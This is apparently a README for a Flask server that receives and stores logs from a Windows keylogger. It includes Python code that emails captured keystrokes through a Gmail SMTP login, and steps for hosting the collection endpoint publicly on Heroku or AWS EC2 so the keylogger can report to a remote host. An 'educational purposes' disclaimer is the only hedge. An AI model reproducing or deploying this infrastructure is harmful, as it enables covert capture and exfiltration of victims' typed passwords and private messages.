Keylogger Log Server
Overview
This Flask-based log server receives and stores logs from the Windows-based keylogger (keylogger.c). It supports local operation (e.g., http://127.0.0.1:5000 or http://192.168.1.3:5000), SMTP email transmission, or deployment on a remote server for receiving logs.
Features

Receives keylogger logs via HTTP POST or SMTP email.
Stores logs in a local file (e.g., server_logs.txt) with timestamps.
Lightweight and customizable for local or remote deployment.

Requirements

OS: Any OS supporting Python (tested on Windows 11)
Python: Version 3.6+
Dependencies: Flask (pip install flask), smtplib (standard library for SMTP)
Network: Local network access or internet for remote/SMTP setup

Setup Instructions

Install Python 3.6+ from python.org.

Install Flask:
pip install flask


Clone or download the log_server.py file.

Configure the keylogger to send logs to the server’s URL (e.g., http://127.0.0.1:5000/log) or email address for SMTP.


Customization
Local Server

Run the server locally (default):
python log_server.py


Access at http://127.0.0.1:5000 or a local network IP (e.g., 192.168.1.3:5000).

Update the keylogger’s URL to match the server’s IP/port.


SMTP Email Transmission

Modify log_server.py to use smtplib for email:
import smtplib
from email.mime.text import MIMEText

def send_email(log_data, recipient_email):
    msg = MIMEText(log_data)
    msg['Subject'] = 'Keylogger Log'
    msg['From'] = 'your_email@example.com'
    msg['To'] = recipient_email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login('your_email@example.com', 'your_app_password')
        server.send_message(msg)


Generate an app-specific password for your email provider (e.g., Gmail).

Update the keylogger to call send_email with logs and your recipient email.


Remote Server Deployment

Deploy the Flask server to a cloud platform (e.g., Heroku, AWS EC2):
Heroku:
Create a Heroku app: heroku create your-app-name.

Push the code: git push heroku main.

Set the port dynamically in log_server.py:
import os
port = int(os.environ.get('PORT', 5000))
app.run(host='0.0.0.0', port=port)






Update the keylogger’s URL to the remote server’s public IP or domain (e.g., http://your-ec2-public-ip:5000/log).

Usage

Start the server (local or remote):
python log_server.py


The server receives logs at the /log endpoint (HTTP POST) or via email (SMTP).

Logs are saved to server_logs.txt or emailed with timestamps.

Stop the server with Ctrl+C.


Considerations

Do not store or transmit sensitive data without encryption.

Challenges Overcome

Resolved networking issues for stable HTTP/SMTP log transmission.
Configured Flask server for reliable POST request handling.
Managed log storage to prevent data loss.
Overcame SMTP authentication and remote deployment hurdles.

License
This project is for educational purposes only and is not licensed for commercial or unethical use.
